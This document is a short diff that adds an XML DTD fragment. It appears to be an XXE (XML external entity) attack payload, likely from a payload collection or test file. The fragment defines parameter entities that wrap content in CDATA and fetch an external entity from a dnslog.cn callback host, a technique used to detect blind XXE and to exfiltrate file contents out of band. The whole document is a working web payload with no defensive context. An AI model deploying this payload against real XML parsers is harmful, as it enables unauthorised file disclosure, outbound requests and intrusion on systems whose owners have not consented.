@@ -1,0 +1,4 @@
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % stuff SYSTEM "http://610xrp.dnslog.cn/">
+<!ENTITY % end "]]>">
+<!ENTITY test "%start;%stuff;%end;">
